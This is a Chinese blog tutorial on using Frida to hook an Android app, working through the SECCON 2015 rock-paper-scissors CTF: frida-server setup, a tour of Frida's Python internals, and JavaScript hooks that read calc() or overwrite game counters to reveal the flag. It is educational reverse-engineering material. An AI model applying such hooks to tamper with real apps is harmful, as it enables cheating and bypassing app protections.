<h2 id="0x01-资源和环境"><a href="#0x01-资源和环境" class="headerlink" title="0x01 资源和环境"></a>0x01 资源和环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure>

<h2 id="0x02-运行模式"><a href="#0x02-运行模式" class="headerlink" title="0x02 运行模式"></a>0x02 运行模式</h2><p>Frida通过其强大的仪器核心Gum提供动态检测，Gum是用C语言编写的。因为这种检测逻辑很容易发生变化，所以通常需要用脚本语言编写，这样在开发和维护它时会得到一个简短的反馈循环。这就是GumJS发挥作用的地方。只需几行C就可以在运行时内运行一段JavaScript，它可以完全访问Gum的API，允许您挂钩函数，枚举加载的库，导入和导出的函数，读写内存，扫描模式的内存等</p>
<h2 id="0x03-Frida安装"><a href="#0x03-Frida安装" class="headerlink" title="0x03 Frida安装"></a>0x03 Frida安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922142344067.png" alt="image-20200922142344067"></p>
<p>安卓端安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143332932.png" alt="image-20200922143332932"></p>
<p>看到我的cpu是armv8 64位的 所以对应的去下载相应的版本</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143734995.png" alt="image-20200922143734995"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push frida-server-12.11.17-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod 777 frida-server-12.11.17-android-arm64</span><br><span class="line">.&#x2F;frida-server-12.11.17-android-arm64</span><br></pre></td></tr></table></figure>

<p>在bash下frida-ps -U</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922144633734.png" alt="image-20200922144633734"></p>
<h2 id="0x04-Hook示例的安装与分析"><a href="#0x04-Hook示例的安装与分析" class="headerlink" title="0x04 Hook示例的安装与分析"></a>0x04 Hook示例的安装与分析</h2><p>Frida官网给我们了一个ctf的示例，就以此为例子，开始学习frida在android逆向的使用。<br>rps.apk <a href="https://github.com/ctfs/write-ups-2015/raw/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1/rps.apk">下载地址</a></p>
<p>使用虚拟机或者自己的手机将应用安装好，发现是一个简单的石头剪刀布的游戏应用，简单的玩了一下，没什么特别的，直接分析代码吧，看看到底想干什么。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103121714.png" alt="image-20200923103121714"></p>
<h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>使用jadx-gui反编译，发现app没有加壳和混淆，当然一来就加壳和混淆的话对我们就太不友好了，接下分析就简单了，直接看java代码。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103824726.png" alt="image-20200923103824726"></p>
<p>在MainActivity中找到OnCreate()方法，可以看到只是简单的声明了button控件以及对应的监听器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">  super.onCreate(paramBundle);</span><br><span class="line">  setContentView(2130968600);</span><br><span class="line">  this.P &#x3D; (Button)findViewById(2131492941);</span><br><span class="line">  this.S &#x3D; (Button)findViewById(2131492943);</span><br><span class="line">  this.r &#x3D; (Button)findViewById(2131492942);</span><br><span class="line">  this.P.setOnClickListener(this);</span><br><span class="line">  this.r.setOnClickListener(this);</span><br><span class="line">  this.S.setOnClickListener(this);</span><br><span class="line">  this.flag &#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续查看button的onclick方法，可以看出cpu是通过随机数组出的，其判断输赢的方法在this.showMessageTask中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void onClick(View paramView) &#123;</span><br><span class="line">   if (this.flag &#x3D;&#x3D; 1)</span><br><span class="line">     return; </span><br><span class="line">   this.flag &#x3D; 1;</span><br><span class="line">   ((TextView)findViewById(2131492946)).setText(&quot;&quot;);</span><br><span class="line">   TextView textView1 &#x3D; (TextView)findViewById(2131492944);</span><br><span class="line">   TextView textView2 &#x3D; (TextView)findViewById(2131492945);</span><br><span class="line">   this.m &#x3D; 0;</span><br><span class="line">   this.n &#x3D; (new Random()).nextInt(3);	&#x2F;&#x2F;随机数0，1，2</span><br><span class="line">   int i &#x3D; this.n;</span><br><span class="line">   (new String[3])[0] &#x3D; &quot;CPU: Paper&quot;;</span><br><span class="line">   (new String[3])[1] &#x3D; &quot;CPU: Rock&quot;;</span><br><span class="line">   (new String[3])[2] &#x3D; &quot;CPU: Scissors&quot;;</span><br><span class="line">   textView2.setText((new String[3])[i]);</span><br><span class="line">   if (paramView &#x3D;&#x3D; this.P) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Paper&quot;);</span><br><span class="line">     this.m &#x3D; 0;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.r) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Rock&quot;);</span><br><span class="line">     this.m &#x3D; 1;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.S) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Scissors&quot;);</span><br><span class="line">     this.m &#x3D; 2;</span><br><span class="line">   &#125; </span><br><span class="line">   this.handler.postDelayed(this.showMessageTask, 1000L);	&#x2F;&#x2F;输赢判断方法</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跟进分析showMessageTask，可以看到如果赢了mainActivity.cnt会+1，但是一旦输了cnt就会置0，而获取flag的要求是我们得获胜1000次，…… :(</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">      TextView textView &#x3D; (TextView)MainActivity.this.findViewById(2131492946);</span><br><span class="line">      if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">        textView.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; </span><br><span class="line">      if (1000 &#x3D;&#x3D; MainActivity.this.cnt)</span><br><span class="line">        textView.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;); </span><br><span class="line">      MainActivity.this.flag &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>简单分析一下获取flag需要的条件，总结有3个办法:</p>
<ol>
<li>分析calc()方法能算出答案，但这个方法在so中，得分析汇编代码才行，当然可以尝试使用ida pro，F5查看C代码分析，前提是算法不难。</li>
<li>获取calc函数的返回值，从而计算答案。</li>
<li>还有一个方法就是，直接将MainActivity.this.cnt的值构造成1000。</li>
</ol>
<p>接下来就用frida，使用后两种思路来解这个简单的示例。但在这之前得先了解Frida自带的Messages机制，了解frida怎么从通过一个python脚本发送和接收message消息是一个提升理解frida的好方法。</p>
<h2 id="0x04-Frida自带的Messages机制与进程交互"><a href="#0x04-Frida自带的Messages机制与进程交互" class="headerlink" title="0x04 Frida自带的Messages机制与进程交互"></a>0x04 Frida自带的Messages机制与进程交互</h2><p>先来看看一个Messages的模板，这里用到的语言分别是python和javascript，他们之间的关系是python作为载体，javascript作为在android中真正执行代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#hook代码，采用javascript编写</span></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">//javascript代码，重点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#自定义回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重点的4行代码</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">&#x27;应用完整包名&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>当然如果是对此简单的使用，只需要编写jscode，以及填写你要hook的应用完整包名就行了，不过如果单纯只会用可能在以后会被模板限制，所以一探究竟还是很有必要。<br>可以在Bash中，使用python终端的help()函数找到frida库的源代码的绝对路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import frida</span><br><span class="line">help(frida)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923112932246.png" alt="image-20200923112932246"></p>
<p>接下来就来具体看看这几句代码做了什么事情。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;应用完整包名&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>首先使用了frida.get_usb_device()，返回了一个_get_device函数，跟进_get_device方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_usb_device(timeout &#x3D; 0):</span><br><span class="line">    return _get_device(lambda device: device.type &#x3D;&#x3D; &#39;tether&#39;, timeout)</span><br></pre></td></tr></table></figure>

<p>在_get_device中，通过get_device_manager()实例化DeviceManager类，并调用该类中的enumerate_devices()方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def _get_device(predicate, timeout):</span><br><span class="line">    mgr &#x3D; get_device_manager()                &#x2F;&#x2F;获取设备管理</span><br><span class="line">    def find_matching_device():               &#x2F;&#x2F;寻找匹配设备</span><br><span class="line">        usb_devices &#x3D; [device for device in mgr.enumerate_devices() if predicate(device)]</span><br><span class="line">        if len(usb_devices) &gt; 0:</span><br><span class="line">            return usb_devices[0]</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line">    device &#x3D; find_matching_device()</span><br><span class="line">   ...省略</span><br></pre></td></tr></table></figure>

<p>get_device_manager()代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_device_manager():</span><br><span class="line">    global _device_manager</span><br><span class="line">    if _device_manager is None:</span><br><span class="line">        from . import core</span><br><span class="line">        _device_manager &#x3D; core.DeviceManager(_frida.DeviceManager())</span><br><span class="line">    return _device_manager</span><br></pre></td></tr></table></figure>

<p>DeviceManager中enumerate_devices(）方法，可以看到enumerate_devices()方法实际上是返回了一个Device()类的实例化对象List。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class DeviceManager(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Device()类的实例化。</span><br><span class="line">    def enumerate_devices(self):</span><br><span class="line">        return [Device(device) for device in self._impl.enumerate_devices()]</span><br><span class="line"> </span><br><span class="line">    def add_remote_device(self, host):</span><br><span class="line">        return Device(self._impl.add_remote_device(host))</span><br><span class="line"> </span><br><span class="line">    def remove_remote_device(self, host):</span><br><span class="line">        self._impl.remove_remote_device(host)</span><br><span class="line"> </span><br><span class="line">    def get_device(self, device_id):</span><br><span class="line">        devices &#x3D; self._impl.enumerate_devices()</span><br><span class="line">        if device_id is None:</span><br><span class="line">            return Device(devices[0])</span><br><span class="line">        for device in devices:</span><br><span class="line">            if device.id &#x3D;&#x3D; device_id:</span><br><span class="line">                return Device(device)</span><br><span class="line">        raise _frida.InvalidArgumentError(&quot;unable to find device with id %s&quot; % device_id)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br></pre></td></tr></table></figure>

<p>继续跟进Device类中的，就找到了attach()方法。在attach方法这是设置断点，看看传入的数据。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923213529047.png" alt="image-20200923213529047"></p>
<p>接下来提供的“应用完整名”是通过self._pid_of()函数去找到对应的进程号pid，然后将pid后通过Session类初始化。到此第一句代码过程就算是明白了，最终得到的是一个对应进程号pid的Session实例化对象process。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Device(object):</span><br><span class="line">    def __init__(self, device):</span><br><span class="line">        self.id &#x3D; device.id</span><br><span class="line">        self.name &#x3D; device.name</span><br><span class="line">        self.icon &#x3D; device.icon</span><br><span class="line">        self.type &#x3D; device.type</span><br><span class="line">        self._impl &#x3D; device</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    ...节省空间删除部分方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def kill(self, target):</span><br><span class="line">        self._impl.kill(self._pid_of(target))</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Session的实例化对象</span><br><span class="line">    def attach(self, target):</span><br><span class="line">        return Session(self._impl.attach(self._pid_of(target)))</span><br><span class="line"> </span><br><span class="line">    def inject_library_file(self, target, path, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_file(self._pid_of(target), path, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def inject_library_blob(self, target, blob, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_blob(self._pid_of(target), blob, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def _pid_of(self, target):</span><br><span class="line">        if isinstance(target, numbers.Number):</span><br><span class="line">            return target</span><br><span class="line">        else:</span><br><span class="line">            return self.get_process(target).pid</span><br></pre></td></tr></table></figure>

<p>第二句，紧接着process.create_script(jscode)，可以看到它返回一个Script类的实例化，参数不确定。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def create_script(self, *args, **kwargs):</span><br><span class="line">        return Script(self._impl.create_script(*args, **kwargs))</span><br></pre></td></tr></table></figure>

<p>跟进Script类，可以找到on()方法，在on方法中可以设置自定义回调函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Script(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self.exports &#x3D; ScriptExports(self)</span><br><span class="line"> </span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line">        self._on_message_callbacks &#x3D; []</span><br><span class="line">        self._log_handler &#x3D; self._on_log</span><br><span class="line"> </span><br><span class="line">        self._pending &#x3D; &#123;&#125;</span><br><span class="line">        self._next_request_id &#x3D; 1</span><br><span class="line">        self._cond &#x3D; threading.Condition()</span><br><span class="line"> </span><br><span class="line">        impl.on(&#39;destroyed&#39;, self._on_destroyed)</span><br><span class="line">        impl.on(&#39;message&#39;, self._on_message)</span><br><span class="line"> </span><br><span class="line">   ...节省空间删除部分类方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def load(self):</span><br><span class="line">        self._impl.load()</span><br><span class="line"> </span><br><span class="line">   &#x2F;&#x2F;设置自定义回调函数</span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        if signal &#x3D;&#x3D; &#39;message&#39;:</span><br><span class="line">            self._on_message_callbacks.append(callback)</span><br><span class="line">        else:</span><br><span class="line">            self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">在IDE中可以看到_on_message_callbacks中存放的on_message函数地址。</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924155129213.png" alt="image-20200924155129213"><br>接下来调用load()方法，在服务端就启动javascript脚本了，至于在frida-server服务端怎么执行的，可逆向研究一下frida-server，它才是真正的核心。</p>
<h2 id="0x05-Javascript代码构造与执行"><a href="#0x05-Javascript代码构造与执行" class="headerlink" title="0x05 Javascript代码构造与执行"></a>0x05 Javascript代码构造与执行</h2><h3 id="方法一：获取calc-返回值"><a href="#方法一：获取calc-返回值" class="headerlink" title="方法一：获取calc()返回值"></a>方法一：获取calc()返回值</h3><p>第一种思路就是直接获取calc的返回值，从native函数定义上知道它的返回值是int类型，当然直接获取calc函数的返回值是解出问题最简单的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public native int calc();</span><br></pre></td></tr></table></figure>

<p>那怎么获取calc()函数的返回值呢，这个函数在MainActivity类中，直接引用该类下的calc()方法，不就ok了吗，原理是这样，下面就来构造一下Javascript代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Java.Perform 开始执行JavaScript脚本。</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">&#x2F;&#x2F;定义变量MainActivity，Java.use指定要使用的类</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook该类下的onCreate方法，重新实现它</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用calc()方法，获取返回值</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        &#x2F;&#x2F;解出答案</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>JavaScript代码就是这样，如果不是很理解，学习一下JavaScript基础即可，下面看看完整的python脚本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>不知道为什么hook的为应用的onCreate方法始终不行所以hook对应的onClick方法进行结果如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924110841383.png" alt="image-20200924110841383"></p>
<h3 id="方法二：修改cnt的值为1000"><a href="#方法二：修改cnt的值为1000" class="headerlink" title="方法二：修改cnt的值为1000"></a>方法二：修改cnt的值为1000</h3><p>第二种思路也比较简单，我们需要修改cnt的值，但如果直接修改cnt的初始值为1000的话，在游戏中可能存在不确定因素，比如输了会置0，赢了cnt值就变成1001了，所以还得控制一下输赢，而输赢的条件是电脑出什么，所以最终hook的方法就在onClick中。<br>从onClick()中可以知道，控制输赢的在于修改this.n 和 this.m的值，再来看看源代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            TextView tv3 &#x3D; (TextView) MainActivity.this.findViewById(R.id.textView3);</span><br><span class="line">            MainActivity mainActivity;</span><br><span class="line">            &#x2F;&#x2F;我方:布 CPU：石头 or 我方：石头 CUP：剪刀 ，则为赢</span><br><span class="line">            if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;反过来当然是输咯</span><br><span class="line">            &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">             &#x2F;&#x2F;一样则打平</span><br><span class="line">            &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">                tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;我布  cup:剪刀</span><br><span class="line">            &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;获胜1000次则能够获取flag</span><br><span class="line">            if (1000 &#x3D;&#x3D; MainActivity.this.cnt) &#123;</span><br><span class="line">                tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.this.flag &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>JavaScript代码编写如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook onClick方法，此处要注意的是onClick方法是传递了一个View参数v</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用onClick,模拟点击事件</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        &#x2F;&#x2F;修改参数  满足第一个if 或者 最后一个else即可</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>完整python代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import frida, sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>执行python脚本，任意点击按钮，答案就出来了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924112142535.png" alt="image-20200924112142535"></p>
<h3 id="方法三：分析calc-方法算出答案"><a href="#方法三：分析calc-方法算出答案" class="headerlink" title="方法三：分析calc()方法算出答案"></a>方法三：分析calc()方法算出答案</h3><p>calc() 这个方法在so中，对应的分析汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">  System.loadLibrary(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public native int calc();</span><br></pre></td></tr></table></figure>

<p>直接使用ida pro或者radare2分析汇编代码也是可以的。这里给出用radare2反汇编出来的代码。可以看到，calc()函数就单纯的返回了int值7</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924113024992.png" alt="image-20200924113024992"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924114127105.png" alt="image-20200924114127105"></p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>一般分析流程</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.反编译apk，分析代码寻找hook点。</span><br><span class="line">2.编写js代码，调用类的方法或者替换。</span><br><span class="line">3.在python中执行即可。</span><br></pre></td></tr></table></figure>

<h5 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…."></a>更新中….</h5>]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Frida</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>宏病毒的研究和学习</title>
    <url>/2018/06/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E7%A0%94%E7%A9%B6%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
